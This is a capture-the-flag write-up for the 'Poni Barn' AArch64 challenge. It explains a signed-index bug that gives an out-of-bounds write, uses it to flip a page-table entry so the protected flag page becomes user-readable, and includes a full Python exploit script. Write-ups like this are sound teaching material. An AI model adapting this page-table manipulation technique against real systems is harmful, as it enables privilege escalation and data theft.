# Poni Barn

## Challenge

We are given a bare-metal AArch64 QEMU image and a remote TCP service behind SNI/TLS:

```text
tcp-ponibarn-4a258bae501e0fae.chall.bts.wh.edu.pl
```

The challenge provides:

- `rom_patched.elf`
- `Dockerfile`
- `run.sh`
- `serve.sh`

The service runs the ELF in QEMU and exposes a small menu-driven pony barn.

## Recon

Basic strings immediately show the menu and a placeholder flag page:

```text
~* welcome to poni's pony barn! *~
we have 256 ponies and they all need a friend!
1) pick a pony
2) name your pony
3) look at your pony
4) pet your pony
5) feed your pony
6) read pony's magic number
7) change pony's magic number
8) peek somewhere
9) sparkle dust
0) leave the barn :(
BtSCTF{________________________________}
```

Important symbols:

```text
0x40010000  __user_start
0x40020000  __barn
0x40021000  __l3_table
0x40023000  __flag_page / flag_data
```

The user program stores 256 pony objects at `0x40020000`. Each pony is 16 bytes:

```c
struct pony {
    char name[8];
    uint64_t magic;
};
```

The `peek somewhere` option calls:

```asm
safe_load:
    ldr x0, [x0]
    ret
```

So if an address is mapped as user-readable, the menu can leak 8 bytes from it.

## Bug

The vulnerable code is in the pony picker:

```asm
cmp x0, #0xff
b.gt invalid
mov x19, #0x40020000
add x19, x19, x0, lsl #4
```

Only values greater than `255` are rejected. Negative values are accepted.

Even better, the input parser supports hex numbers, and the signed comparison happens before the address arithmetic. This means a huge value such as:

```text
0x8000000000000111
```

passes the signed `> 255` check because it is negative as a signed 64-bit integer, but its low bits still control:

```text
0x40020000 + (idx << 4)
```

The `change pony's magic number` option writes to:

```text
selected_pony + 8
```

So we get a controlled 8-byte write at:

```text
0x40020000 + (idx << 4) + 8
```

## Page Table Target

The kernel sets up page tables in RAM. The L3 table is at:

```text
0x40021000
```

The flag page is at:

```text
0x40023000
```

Its L3 entry is therefore:

```text
0x40021000 + (0x23 * 8) = 0x40021118
```

The original flag page descriptor leaks as:

```text
0x0060000040023703
```

That mapping is readable by the kernel, but not by EL0/user code. The user-readable mappings nearby use the `0x40` access bit, for example:

```text
0x0060000040023743
```

So the plan is:

1. Use the bad pony index to select a fake pony whose `magic` field aliases `0x40021118`.
2. Write `0x0060000040023743` there.
3. Use menu option `9`, sparkle dust, which performs a TLB flush syscall.
4. Use menu option `8`, peek, to read `0x40023000`.

The index that makes the magic write land on `0x40021118` is:

```text
0x8000000000000111
```

because:

```text
0x40020000 + (0x111 << 4) + 8 = 0x40021118
```

## Exploit

The challenge asks for snicat, but Python TLS with SNI is equivalent for automation.

```python
import socket
import ssl
import struct
import re

HOST = "tcp-ponibarn-4a258bae501e0fae.chall.bts.wh.edu.pl"
PORT = 443

raw = socket.create_connection((HOST, PORT), timeout=10)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(raw, server_hostname=HOST)
s.settimeout(10)

buf = b""

def recv_until(token):
    global buf
    while token not in buf:
        chunk = s.recv(4096)
        if not chunk:
            raise EOFError(buf)
        buf += chunk
    idx = buf.index(token) + len(token)
    out, buf = buf[:idx], buf[idx:]
    return out

def sendline(data):
    if isinstance(data, int):
        data = str(data)
    if isinstance(data, str):
        data = data.encode()
    s.sendall(data + b"\n")

at_prompt = False

def menu(choice):
    global at_prompt
    if not at_prompt:
        recv_until(b"choose: ")
    at_prompt = False
    sendline(choice)

def pick(index):
    menu(1)
    recv_until(b"which pony? (0-255): ")
    sendline(index)

def write_magic(index, value):
    pick(index)
    menu(7)
    recv_until(b"new magic number: ")
    sendline(hex(value))

def peek(addr):
    global at_prompt
    menu(8)
    recv_until(b"where to look: ")
    sendline(hex(addr))
    out = recv_until(b"choose: ")
    at_prompt = True
    match = re.search(rb"VAL:0x([0-9a-f]{16})", out)
    if not match:
        raise RuntimeError(out.decode("latin1", "replace"))
    return int(match.group(1), 16)

# Make the flag page user-readable.
write_magic("0x8000000000000111", 0x0060000040023743)

# Flush TLB.
menu(9)
recv_until(b"DONE")
at_prompt = False

flag = b""
for off in range(0, 48, 8):
    value = peek(0x40023000 + off)
    flag += struct.pack("<Q", value)
    if b"}" in flag:
        break

print(re.search(rb"BtSCTF\{[^}]+\}", flag).group(0).decode())
```

## Flag

```text
BtSCTF{ponies_ponies_ponies_SWAGGGGG!!!}
```
